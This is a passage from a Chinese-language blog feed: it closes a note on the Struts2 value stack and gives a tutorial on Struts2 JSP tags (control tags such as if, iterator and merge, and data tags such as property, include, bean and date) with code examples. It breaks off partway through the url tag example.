对象中的所有属性。</li><li>application：该 Map 中包含当前 application 对象中的所有属性。</li><li>attr：该 Map 按如下顺序检索某个属性：request，session，application。</li></ul><h2 id="0x07-获取值栈数据的方式"><a href="#0x07-获取值栈数据的方式" class="headerlink" title="0x07 获取值栈数据的方式"></a>0x07 获取值栈数据的方式</h2><p>在 Struts2 中，值栈的主要作用就是解决从 Action 到页面的数据交换问题。在采用属性驱动和模型驱动交换数据时，Struts2 会将对象自动存储到 ValueStack 中，其存储说明如下：</p><ul><li>属性驱动：每次请求访问 Action 的对象时，Action 中的属性对象会被自动压入 ValueStack 中。</li><li>模型驱动：Action 如果实现了 ModelDriven 接口，那么 ModelDrivenInterceptor 拦截器会生效，会将 model 对象压入到 ValueStack 中。</li></ul><p>属性对象或 model 对象存储到 ValueStack 中后，就可以直接从 ValueStack 中获取页面所需的数据。</p><p>Demo参考：<a href="http://c.biancheng.net/view/4145.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4145.html</a></p><h2 id="0x08-通过EL访问值栈的数据"><a href="#0x08-通过EL访问值栈的数据" class="headerlink" title="0x08 通过EL访问值栈的数据"></a>0x08 通过EL访问值栈的数据</h2><p>具体参考：<a href="http://c.biancheng.net/view/4146.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4146.html</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之标签</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8B%E6%A0%87%E7%AD%BE/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之标签/</id>
    <published>2020-04-30T16:00:04.000Z</published>
    <updated>2020-08-15T06:40:45.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-标签的分类和使用"><a href="#0x01-标签的分类和使用" class="headerlink" title="0x01 标签的分类和使用"></a>0x01 标签的分类和使用</h2><p>Struts2 是一个优秀的 MVC 框架，其实现重点主要放在了业务逻辑控制器部分和视图页面部分。控制器部分主要由 Action 提供支持，而视图页面部分则由大量的标签提供支持。</p><p>Struts2 的标签库是一个比较完善且功能强大的标签库，它将所有标签都统一到一个标签库中，从而简化了标签的使用；它提供了对主题和模板的支持，极大地简化了视图页面代码的编写；它还提供了对 Ajax 的支持，极大地丰富了视图页面的展示效果。</p><p>与 JSTL（JSP Standard Tag Library，JSP标准标签库）相比，Struts2 标签库更加易用和强大。</p><h3 id="标签库的分类"><a href="#标签库的分类" class="headerlink" title="标签库的分类"></a>标签库的分类</h3><p>Struts2 框架对整个标签库进行了分类，按其功能大致可分为两类，如图所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/1.png" alt=""></p><p>可以看出，Struts2 的标签库主要分为两大类：普通标签和 UI 标签。普通标签的主要功能是在页面生成时控制页面代码的执行流程；UI 标签的主要功能是以丰富且可复用的 HTML 文件显示数据。</p><p>普通标签又分为控制标签（Control Tags）和数据标签（Data Tags）。控制标签用于完成条件逻辑和循环逻辑的控制，也可用于做集合的操作。数据标签用于输出后台的数据和完成其他数据访问功能。</p><p>UI 标签又分为表单标签（Form Tags）、非表单标签（Non-Form Tags）和 Ajax 标签。表单标签主要用于生成 HTML 页面中的表单元素，非表单标签主要用于生成非表单的可视化元素，如输出 Action 中封装的信息等。Ajax 标签主要用于提供对 Ajax 技术的支持。</p><h3 id="标签的使用"><a href="#标签的使用" class="headerlink" title="标签的使用"></a>标签的使用</h3><p>使用 Struts2 的标签库非常简单，一般只需在 JSP 文件内使用 taglib 指令导入 Struts2 标签库即可，其导入代码如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br></pre></td></tr></table></figure><p>在上述代码中，taglib 指令的 uri 属性用于指定引入标签库描述符文件的位置，prefix 属性用于指定引入标签库描述符文件的前缀。在 JSP 文件中，所有的 Struts2 标签都建议使用 s 作为前缀。</p><h2 id="0x02-控制标签"><a href="#0x02-控制标签" class="headerlink" title="0x02 控制标签"></a>0x02 控制标签</h2><p>针对页面中经常需要实现的流程控制和循环等操作，Struts2标签库中提供了控制标签。</p><h3 id="if和else标签"><a href="#if和else标签" class="headerlink" title="if和else标签"></a>if和else标签</h3><p>Struts2 标签库中的 <code>&lt;s:if&gt;、&lt;s:elseif&gt;、&lt;s:else&gt;</code> 标签与 Java 中的 if、else if 和 else 语句功能类似，主要用于程序的分支逻辑控制。其中，只有 <code>&lt;s:if&gt;</code> 标签可以单独使用，而 <code>&lt;s:elseif&gt;、&lt;s:else&gt;</code> 都必须与 <code>&lt;s:if&gt;</code> 标签结合才能使用。其使用语法格式如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:<span class="keyword">if</span> test=<span class="string">"表达式1"</span>&gt;</span><br><span class="line">    标签体</span><br><span class="line">&lt;/s:if&gt;</span><br><span class="line">&lt;s:elseif test=<span class="string">"表达式2"</span>&gt;</span><br><span class="line">    标签体</span><br><span class="line">&lt;/s:elseif&gt;</span><br><span class="line">&lt;s:<span class="keyword">else</span>&gt;</span><br><span class="line">    标签体</span><br><span class="line">&lt;/s:else&gt;</span><br></pre></td></tr></table></figure><p>在上述语法格式中，<code>&lt;s:if&gt; 和 &lt;s:elseif&gt;</code> 标签必须指定 test 属性，该属性用于设置标签的判断条件，其值是一个 boolean 类型的条件表达式。</p><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_if_else_tags.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_if_else_tags.html</a></p><h3 id="iterator标签"><a href="#iterator标签" class="headerlink" title="iterator标签"></a>iterator标签</h3><p><code>&lt;s:iterator&gt;</code> 标签主要用于对集合中的数据进行迭代，它可以根据条件遍历集合中的数据。&lt;s:iterator&gt; 标签的属性及相关说明如表所示。</p><table><thead><tr><th>属性</th><th>是否必须</th><th>默认值</th><th>类型</th><th>描  述</th></tr></thead><tbody><tr><td>begin</td><td>否</td><td>0</td><td>Integer</td><td>迭代数组或集合的起始位置</td></tr><tr><td>end</td><td>否</td><td>数组或集合的长度大小减 1，若 Step 为负，则为 0。</td><td>Integer</td><td>迭代数组或集合的结束位置</td></tr><tr><td>status</td><td>否</td><td>false</td><td>Boolean</td><td>迭代过程中的状态</td></tr><tr><td>step</td><td>否</td><td>1</td><td>Integer</td><td>指定每一次迭代后索引增加的值</td></tr><tr><td>value</td><td>否</td><td>无</td><td>String</td><td>迭代的数组或集合对象</td></tr><tr><td>var</td><td>否</td><td>无</td><td>String</td><td>将生成的 Iterator 设置为 page 范围的属性</td></tr><tr><td>id</td><td>否</td><td>无</td><td>String</td><td>指定了集合元素的 id，现已用 var 代替</td></tr></tbody></table><p>如果在 <code>&lt;s:iterator&gt;</code> 标签中指定 status 属性，就可以通过该属性获取迭代过程中的状态信息，如元素数、当前索引值等。通过 status 属性获取信息的方法如下表所示（假设其属性值为 st）。</p><table><thead><tr><th>方 法</th><th>说 明</th></tr></thead><tbody><tr><td>st.count</td><td>返回当前已经遍历的集合元素的个数</td></tr><tr><td>st.first</td><td>返回当前遍历元素是否为集合的第一个元素</td></tr><tr><td>st.last</td><td>返回当前遍历元素是否为集合的最后一个元素</td></tr><tr><td>st.index</td><td>返回遍历元素的当前索引值</td></tr></tbody></table><p>这些iterator将迭代一个值。可迭代值可以是以下任一值：java.util.Collection，java.util.Iterator。在迭代一个iterator时，可以使用<strong>Sort</strong>标签对结果进行排序，或者使用<strong>SubSet</strong>标签来获取列表或数组的子集。</p><p>以下示例是检索值栈上当前对象的getDays()方法的值，并使用它迭代。<code>&lt;s:property/&gt;</code>标签印出迭代器的当前值。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:iterator value=<span class="string">"days"</span>&gt;</span><br><span class="line">  &lt;p&gt;day is: &lt;s:property/&gt;&lt;/p&gt;</span><br><span class="line">&lt;/s:iterator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_iterator_tags.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_iterator_tags.html</a></p><h3 id="merge标签"><a href="#merge标签" class="headerlink" title="merge标签"></a>merge标签</h3><p>这些<strong>merge</strong>标签采用两个或多个列表作为参数，并将它们合并在一起，如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:merge <span class="keyword">var</span>=<span class="string">"myMergedIterator"</span>&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList1&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList2&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList3&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:merge&gt;</span><br><span class="line">&lt;s:iterator value=<span class="string">"%&#123;#myMergedIterator&#125;"</span>&gt;</span><br><span class="line">     &lt;s:property /&gt;</span><br><span class="line">&lt;/s:iterator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_merge_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_merge_tag.html</a></p><h3 id="append标签"><a href="#append标签" class="headerlink" title="append标签"></a>append标签</h3><p>这些<strong>append</strong>标签采用两个或多个列表作为参数，并将它们全部附加在一起，如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:append <span class="keyword">var</span>=<span class="string">"myAppendIterator"</span>&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList1&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList2&#125;"</span> /&gt;</span><br><span class="line">     &lt;s:param value=<span class="string">"%&#123;myList3&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:append&gt;</span><br><span class="line">&lt;s:iterator value=<span class="string">"%&#123;#myAppendIterator&#125;"</span>&gt;</span><br><span class="line">     &lt;s:property /&gt;</span><br><span class="line">&lt;/s:iterator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_append_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_append_tag.html</a></p><h3 id="generator标签"><a href="#generator标签" class="headerlink" title="generator标签"></a>generator标签</h3><p>这些<strong>generator</strong>标签基于提供的val属性生成迭代器。下面的generator标签生成一个迭代器并使用iterator标签打印出来。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:generator val=<span class="string">"%&#123;'aaa,bbb,ccc,ddd,eee'&#125;"</span>&gt;</span><br><span class="line"> &lt;s:iterator&gt;</span><br><span class="line">     &lt;s:property /&gt;&lt;br/&gt;</span><br><span class="line"> &lt;/s:iterator&gt;</span><br><span class="line">&lt;/s:generator&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_generator_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_generator_tag.html</a></p><h2 id="0x03-数据标签"><a href="#0x03-数据标签" class="headerlink" title="0x03 数据标签"></a>0x03 数据标签</h2><p>数据标签主要用于提供各种和数据访问相关的功能，如输出信息和显示调试信息等。</p><h3 id="property标签"><a href="#property标签" class="headerlink" title="property标签"></a>property标签</h3><p><code>&lt;s:property&gt;</code> 标签的作用是输出指定的值，通常输出的是 value 属性指定的值，<code>&lt;s:property&gt;</code> 标签的属性及属性说明如下。</p><ul><li>value：可选属性，指定需要输出的属性值，如果没有指定该属性，则默认输出 ValueStack 栈顶的值（关于值栈内容会在后面教程中进行讲解）。</li><li>id：可选属性，指定该元素的标识。</li><li>default：可选属性，如果要输出的属性值为 null，则显示 default属性的指定值。</li><li>escape：可选属性，指定是否忽略 HTML 代码。默认值是 true，即忽略输出值中的 HTML 代码。</li></ul><p>示例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:push value=<span class="string">"myBean"</span>&gt;</span><br><span class="line">    &lt;!-- Example <span class="number">1</span>: --&gt;</span><br><span class="line">    &lt;s:property value=<span class="string">"myBeanProperty"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Example <span class="number">2</span>: --&gt;TextUtils</span><br><span class="line">    &lt;s:property value=<span class="string">"myBeanProperty"</span> <span class="keyword">default</span>=<span class="string">"a default value"</span> /&gt;</span><br><span class="line">&lt;/s:push&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_property_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_property_tag.html</a></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>propertyTags.jsp，分别对 <code>&lt;s:property&gt;</code> 标签的 value、default 和 escape 属性的使用进行了演示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;property标签&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">输出字符串：</span><br><span class="line">&lt;s:property value=<span class="string">"'this is a string'"</span>/&gt;&lt;br/&gt;</span><br><span class="line">输出默认值：</span><br><span class="line">&lt;s:property value=<span class="string">""</span> <span class="keyword">default</span>=<span class="string">"default_value"</span>/&gt;&lt;br/&gt;</span><br><span class="line">忽略HTML代码：</span><br><span class="line">&lt;s:property value=<span class="string">"'&lt;h2&gt;www.mi1k7ea.com&lt;/h2&gt;'"</span> escape=<span class="string">"true"</span>/&gt;&lt;br/&gt;</span><br><span class="line">不忽略HTML代码：</span><br><span class="line">&lt;s:property value=<span class="string">"'&lt;h2&gt;www.mi1k7ea.com&lt;/h2&gt;'"</span> escape=<span class="string">"false"</span>/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之标签/2.png" alt=""></p><h3 id="action标签"><a href="#action标签" class="headerlink" title="action标签"></a>action标签</h3><p>此标签允许开发人员通过指定action名称和可选的命名空间直接从JSP页面调用action。标签的正文内容用于呈现action的结果。在struts.xml中为此action定义的任何结果处理程序将会被忽略，除非指定executeResult参数。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;Tag to execute the action&lt;/div&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;s:action name=<span class="string">"actionTagAction"</span> executeResult=<span class="string">"true"</span> /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;div&gt;To invokes special method  in action <span class="class"><span class="keyword">class</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span> /&gt;</span></span><br><span class="line">&lt;s:action name="actionTagAction!specialMethod" executeResult="true" /&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_action_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_action_tag.html</a></p><h3 id="include标签"><a href="#include标签" class="headerlink" title="include标签"></a>include标签</h3><p>include标签标签用于在当前页面中包含另一个 Web 资源（如 HTML、JSP、Servlet 等）。该标签有两个属性 id 和 value。其中 id 是可选属性，表示该标签的引用；value 是必填属性，用于指定被包含的 Web 资源文件。</p><p>在 <code>&lt;s:include&gt;</code> 标签中还可以指定多个 <code>&lt;s:param/&gt;</code> 子标签给被包含的 Web 资源传递请求参数。</p><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>file.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;property标签&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;这是被包含页面includefile.jsp&lt;/h2&gt;&lt;br/&gt;</span><br><span class="line">    传递的参数为：&lt;%out.print(request.getParameter(<span class="string">"username"</span>)); %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>includeTags.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;includeTags&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;这是包含页面includeTags.jsp&lt;/h3&gt;&lt;br/&gt;</span><br><span class="line">&lt;s:include value=<span class="string">"file.jsp"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"username"</span> value=<span class="string">"'mi1k7ea'"</span>/&gt;</span><br><span class="line">&lt;/s:include&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之标签/5.png" alt=""></p><h3 id="bean标签"><a href="#bean标签" class="headerlink" title="bean标签"></a>bean标签</h3><p>这些bean标签实例化一个符合JavaBeans规范的类。这个标签有一个主体，可以包含一些Param元素来设置任何mutator方法。如果在BeanTag上设置了var属性，它将把实例化的bean放入值栈的Context中。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:bean name=<span class="string">"org.apache.struts2.util.Counter"</span> <span class="keyword">var</span>=<span class="string">"counter"</span>&gt;</span><br><span class="line">   &lt;s:param name=<span class="string">"first"</span> value=<span class="string">"20"</span>/&gt;</span><br><span class="line">   &lt;s:param name=<span class="string">"last"</span> value=<span class="string">"25"</span> /&gt;</span><br><span class="line">&lt;/s:bean&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_bean_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_bean_tag.html</a></p><h3 id="date标签"><a href="#date标签" class="headerlink" title="date标签"></a>date标签</h3><p>date标签允许以快速简单的方式格式化日期。用户可以指定自定义日期格式（例如“dd/MM/yyyy hh:mm”），可以生成易读的符号（例如“在2小时14分钟内”），或者可以使用属性文件中的key:“struts.date.format”来回退到预定义的格式。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> format=<span class="string">"dd/MM/yyyy"</span> /&gt;</span><br><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> format=<span class="string">"%&#123;getText('some.i18n.key')&#125;"</span> /&gt;</span><br><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> nice=<span class="string">"true"</span> /&gt;</span><br><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> /&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_date_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_date_tag.html</a></p><h3 id="param标签"><a href="#param标签" class="headerlink" title="param标签"></a>param标签</h3><p><code>&lt;s:param&gt;</code> 标签主要用于为其他标签提供参数，通常要与其他标签一起使用。在上一部分使用 <code>&lt;s:include&gt;</code> 标签时，就使用了 <code>&lt;s:param&gt;</code> 标签给被包含的页面传递参数。<code>&lt;s:param&gt;</code> 标签有两种用法，具体如下。</p><p>一种用法是通过标签体指定参数值，用法如下所示：  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:param name="color"&gt;red&lt;/s:param&gt;</span><br></pre></td></tr></table></figure><p>另一种用法是使用 value 属性指定参数值，用法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:param name=<span class="string">"color"</span> value=<span class="string">"'red'"</span>/&gt;</span><br></pre></td></tr></table></figure><p>上述两种用法的功能一样，不同点在于使用 value 属性设置参数值时，需要添加单引号，而使用标签体设置参数值时，不需要添加单引号。</p><p>注意：在使用 value 属性指定参数时，如果不添加单引号，则表示该值为一个引用对象，如果该对象不存在，则为其属性赋值为 null。  </p><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_param_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_param_tag.html</a></p><h3 id="push标签"><a href="#push标签" class="headerlink" title="push标签"></a>push标签</h3><p>这些push标签用于推送堆栈中的值，以简化使用。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:push value=<span class="string">"user"</span>&gt;</span><br><span class="line">    &lt;s:propery value=<span class="string">"firstName"</span> /&gt;</span><br><span class="line">    &lt;s:propery value=<span class="string">"lastName"</span> /&gt;</span><br><span class="line">&lt;/s:push&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_property_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_property_tag.html</a></p><h3 id="set标签"><a href="#set标签" class="headerlink" title="set标签"></a>set标签</h3><p>这些set标签为指定范围内的变量赋值。当你希望将变量分配给复杂表达式，然后仅仅引用该变量而不是复杂表达式时，它是很有用的。可应用的范围是应用程序，会话，请求，页面和action。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:set name=<span class="string">"myenv"</span> value=<span class="string">"environment.name"</span>/&gt;</span><br><span class="line">&lt;s:property value=<span class="string">"myenv"</span>/&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_property_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_property_tag.html</a></p><h3 id="text标签"><a href="#text标签" class="headerlink" title="text标签"></a>text标签</h3><p>这些text标签用于呈现I18n文本消息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- First Example --&gt;</span><br><span class="line">&lt;s:i18n name=<span class="string">"struts.action.test.i18n.Shop"</span>&gt;</span><br><span class="line">    &lt;s:text name=<span class="string">"main.title"</span>/&gt;</span><br><span class="line">&lt;/s:i18n&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Second Example --&gt;</span><br><span class="line">&lt;s:text name=<span class="string">"main.title"</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Third Examlpe --&gt;</span><br><span class="line">&lt;s:text name=<span class="string">"i18n.label.greetings"</span>&gt;</span><br><span class="line">   &lt;s:param &gt;Mr Smith&lt;/s:param&gt;</span><br><span class="line">&lt;/s:text&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_text_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_text_tag.html</a></p><h3 id="url标签"><a href="#url标签" class="headerlink" title="url标签"></a>url标签</h3><p>这些url标签用于创建URL。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;-- Example <span class="number">1</span> --&gt;</span><br><span class="line">&lt;s:url value=<span class="string">"editGadget.action"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"id"</span> value=<span class="string">"%&#123;selected&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:url&gt;</span><br><span class="line"></span><br><span class="line">&lt;-- Example <span class="number">2</span> --&gt;</span><br><span class="line">&lt;s:url action=<span 